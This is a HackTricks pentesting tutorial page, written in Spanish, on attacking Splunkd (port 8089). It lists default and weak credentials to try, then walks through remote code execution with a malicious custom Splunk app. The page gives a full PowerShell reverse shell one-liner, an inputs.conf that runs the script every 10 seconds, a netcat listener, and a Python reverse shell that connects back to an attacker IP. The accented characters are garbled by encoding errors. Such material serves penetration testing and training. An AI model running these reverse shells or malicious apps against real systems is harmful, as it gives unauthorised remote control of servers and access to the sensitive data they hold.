# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Informaci贸n B谩sica**

Splunk es una **herramienta de an谩lisis de registros** que juega un papel crucial en **la recopilaci贸n, an谩lisis y visualizaci贸n de datos**. Aunque su prop贸sito inicial no era servir como una **herramienta SIEM (Gesti贸n de Informaci贸n y Eventos de Seguridad)**, ha ganado popularidad en el 谩mbito de **monitoreo de seguridad** y **an谩lisis de negocios**.

Las implementaciones de Splunk se utilizan frecuentemente para almacenar **datos sensibles** y pueden servir como una **fuente valiosa de informaci贸n** para posibles atacantes si logran comprometer el sistema. **Puerto por defecto:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
El **servidor web de Splunk se ejecuta por defecto en el puerto 8000**.
{% endhint %}

## Enumeraci贸n

### Versi贸n Gratuita

La prueba de Splunk Enterprise se convierte en una **versi贸n gratuita despu茅s de 60 d铆as**, que **no requiere autenticaci贸n**. No es raro que los administradores de sistemas instalen una prueba de Splunk para probarlo, que **posteriormente se olvida**. Esto se convertir谩 autom谩ticamente en la versi贸n gratuita que no tiene ninguna forma de autenticaci贸n, introduciendo un agujero de seguridad en el entorno. Algunas organizaciones pueden optar por la versi贸n gratuita debido a restricciones presupuestarias, sin comprender completamente las implicaciones de no tener gesti贸n de usuarios/roles.

### Credenciales Predeterminadas

En versiones m谩s antiguas de Splunk, las credenciales predeterminadas son **`admin:changeme`**, que se muestran convenientemente en la p谩gina de inicio de sesi贸n.\
Sin embargo, **la 煤ltima versi贸n de Splunk** establece **credenciales** **durante el proceso de instalaci贸n**. Si las credenciales predeterminadas no funcionan, vale la pena verificar contrase帽as d茅biles comunes como `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

### Obtener Informaci贸n

Una vez que iniciamos sesi贸n en Splunk, podemos **navegar por los datos,** ejecutar **informes**, crear **tableros**, **instalar aplicaciones** de la biblioteca Splunkbase e instalar aplicaciones personalizadas.\
Tambi茅n puedes ejecutar c贸digo: Splunk tiene m煤ltiples formas de **ejecutar c贸digo**, como aplicaciones Django del lado del servidor, puntos finales REST, entradas scriptadas y scripts de alerta. Un m茅todo com煤n para obtener ejecuci贸n remota de c贸digo en un servidor Splunk es a trav茅s del uso de una entrada scriptada.

Adem谩s, dado que Splunk se puede instalar en hosts de Windows o Linux, se pueden crear entradas scriptadas para ejecutar scripts de Bash, PowerShell o Batch.

### Shodan

* `Splunk build`

## RCE

### Crear Aplicaci贸n Personalizada

Una aplicaci贸n personalizada puede ejecutar **scripts de Python, Batch, Bash o PowerShell**.\
Ten en cuenta que **Splunk viene con Python instalado**, por lo que incluso en sistemas **Windows** podr谩s ejecutar c贸digo python.

Puedes usar [**este**](https://github.com/0xjpuff/reverse\_shell\_splunk) paquete de Splunk para ayudarnos. El directorio **`bin`** en este repositorio tiene ejemplos para [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) y [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Vamos a recorrer esto paso a paso.

Para lograr esto, primero necesitamos crear una aplicaci贸n personalizada de Splunk utilizando la siguiente estructura de directorio:
```shell-session
tree splunk_shell/

splunk_shell/
 bin
 default
```
El **`bin`** directorio contendr谩 cualquier **script que pretendamos ejecutar** (en este caso, un **PowerShell** reverse shell), y el directorio predeterminado tendr谩 nuestro archivo `inputs.conf`. Nuestro reverse shell ser谩 un **PowerShell one-liner:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
El archivo [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) le dice a Splunk **qu茅 script ejecutar** y cualquier otra condici贸n. Aqu铆 configuramos la aplicaci贸n como habilitada y le decimos a Splunk que ejecute el script cada 10 segundos. El intervalo siempre est谩 en segundos, y la entrada (script) solo se ejecutar谩 si esta configuraci贸n est谩 presente.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Necesitamos el archivo `.bat`, que se ejecutar谩 cuando la aplicaci贸n se despliegue y ejecute la l铆nea de comando de PowerShell.

El siguiente paso es elegir `Install app from file` y subir la aplicaci贸n.

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

Antes de subir la aplicaci贸n personalizada maliciosa, comencemos un listener usando Netcat o [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
En la p谩gina `Upload app`, haz clic en explorar, elige el tarball que creamos anteriormente y haz clic en `Upload`. Tan **pronto como subamos la aplicaci贸n**, se **recibir谩 un reverse shell** ya que el estado de la aplicaci贸n se cambiar谩 autom谩ticamente a `Enabled`.

#### Linux

Si estuvi茅ramos tratando con un **host de Linux**, tendr铆amos que **editar el script de Python `rev.py`** antes de crear el tarball y subir la aplicaci贸n maliciosa personalizada. El resto del proceso ser铆a el mismo, y obtendr铆amos una conexi贸n de reverse shell en nuestro oyente de Netcat y estar铆amos listos para comenzar.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Escalaci贸n de Privilegios

En la siguiente p谩gina puedes encontrar una explicaci贸n de c贸mo este servicio puede ser abusado para escalar privilegios y obtener persistencia:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Referencias

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
